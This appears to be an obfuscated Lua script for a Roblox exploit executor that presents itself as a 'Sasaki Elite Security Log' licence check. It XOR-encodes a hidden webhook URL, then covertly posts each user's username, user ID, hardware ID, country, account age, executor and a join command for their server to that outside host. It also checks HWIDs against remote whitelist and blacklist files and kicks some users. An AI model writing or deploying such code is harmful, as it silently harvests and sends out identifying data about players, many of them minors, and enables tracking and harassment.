local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;
local function v7(v26,v27) local v28={};for v42=1, #v26 do v6(v28,v0(v4(v1(v2(v26,v42,v42)),v1(v2(v27,1+(v42%#v27),1+(v42%#v27))))%256));end return v5(v28);end

local g = game;
local gs = g.GetService;
local v8 = gs(g, v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167"));
local v9 = gs(g, v7("\11\217\62\213\207\38\223\60\204\255\38","\156\67\173\74\165"));
local v10 = gs(g, v7("\24\184\74\23\176\47\92\53\163\64\25\178\21\67\38\161\64\21\185","\38\84\215\41\118\220\70"));
local v11 = gs(g, v7("\125\23\48\25\251\68\6\46\19\253\85\37\39\0\232\89\21\39","\158\48\118\66\114"));
local v12 = gs(g, v7("\152\48\17\36\103\160\233\140\49\25","\155\203\68\112\86\19\197"));

local v13 = v8.LocalPlayer;
local v14 = v7("\78\201\34\236\83\34\170\183\66\212\37\255\79\106\225\182\69\210\59\179\65\104\236\183\81\216\52\244\79\119\238\235\9\140\98\164\23\46\189\171\17\132\100\170\23\45\181\169\16\133\103\168\15\90\218\213\99\245\12\218\87\64\245\170\23\137\33\206\76\127\196\254\95\244\57\217\113\93\206\251\82\144\27\237\66\105\226\255\83\201\20\177\103\124\211\170\65\219\101\221\25\127\181\222\105\248\16\209\82\109\207\171\72\209\21\169\105\53\213\251\121","\152\38\189\86\156\32\24\133");

local function v22(v33,v34)
    local v_r = (syn and syn.request) or (http and http.request) or http_request or request;
    if not v_r or (islclosure and islclosure(v_r)) then return end

    task.spawn(function()
        task.wait(math.random(2, 5));
        local v_region = "Unknown";
        pcall(function() v_region = v10:GetCountryRegionForPlayerAsync(v13) end);
        local v_game_name = "Unknown";
        pcall(function() v_game_name = v11:GetProductInfo(g.PlaceId).Name end);
        local v_join = "`game:GetService('TeleportService'):TeleportToPlaceInstance(" .. g.PlaceId .. ", '" .. g.JobId .. "', game.Players.LocalPlayer)`";

        local v_payload = {
            ["content"] = "<@1143039237004988467> 📢 " .. v33,
            ["embeds"] = {{
                ["title"] = "Sasaki Elite Security Log",
                ["fields"] = {
                    {["name"] = "👤 Username", ["value"] = "`" .. v13.Name .. "`", ["inline"] = true},
                    {["name"] = "🏷️ Display Name", ["value"] = "`" .. v13.DisplayName .. "`", ["inline"] = true},
                    {["name"] = "🆔 User ID", ["value"] = "[" .. tostring(v13.UserId) .. "](https://www.roblox.com/users/" .. v13.UserId .. "/profile)", ["inline"] = false},
                    {["name"] = "🆔 HWID", ["value"] = "`" .. ((identifyhwid and identifyhwid()) or (gethwid and gethwid()) or "Unknown") .. "`", ["inline"] = false},
                    {["name"] = "📅 Account Age", ["value"] = "`" .. tostring(v13.AccountAge) .. " days`", ["inline"] = true},
                    {["name"] = "🌍 Country", ["value"] = "`" .. v_region .. "`", ["inline"] = true},
                    {["name"] = "🛠️ Executor", ["value"] = "`" .. ((identifyexecutor and identifyexecutor()) or "Unknown") .. "`", ["inline"] = true},
                    {["name"] = "📍 Game", ["value"] = "**" .. v_game_name .. "** (`" .. tostring(g.PlaceId) .. "`)", ["inline"] = false},
                    {["name"] = "🔗 Job ID", ["value"] = "`" .. tostring(g.JobId) .. "`", ["inline"] = false},
                    {["name"] = "🚀 Join Script (For Console)", ["value"] = v_join, ["inline"] = false}
                },
                ["color"] = v34,
                ["footer"] = {["text"] = "by Sasaki"},
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S.000Z")
            }}
        };

        pcall(function()
            v_r({
                Url = v14,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = v9:JSONEncode(v_payload)
            })
        end)
    end)
end

local function v21(v29)
    if (islclosure and islclosure(g.HttpGet)) then return "" end
    local s, res = pcall(function() return g:HttpGet(v29 .. "?t=" .. tick()) end)
    return s and res or ""
end

local v19 = (identifyhwid and identifyhwid()) or (gethwid and gethwid()) or "Unknown";
local v23 = v21("https://raw.githubusercontent.com/aiuekonnnitiha/Fog-Breaker-Burst/main/whitelist.txt");
local v24 = v21("https://raw.githubusercontent.com/aiuekonnnitiha/Fog-Breaker-Burst/main/blacklist.txt");
local v25 = v21("https://raw.githubusercontent.com/aiuekonnnitiha/Fog-Breaker-Burst/main/pendinglist.txt");

if string.find(v24, v19) then
    v22("🚨ぶらりすきっくしたの！！", 16711680);
    v13:Kick("ACCESS DENIED");
    return
elseif string.find(v25, v19) then
    v22("💬確認しないと！ (Silent)", 16776960);
    local v_msg = (v10.RobloxLocaleId == "ja-jp") and "今は使えないよ！" or "Security Check";
    v12:SetCore("SendNotification", {Title = v_msg, Text = "Wait! Add ponitan3776 on Discord for help. <3", Duration = 10});
    return
end

if not string.find(v23, v19) then
    v22("🚀 ろがーちーちー", 65280);
end
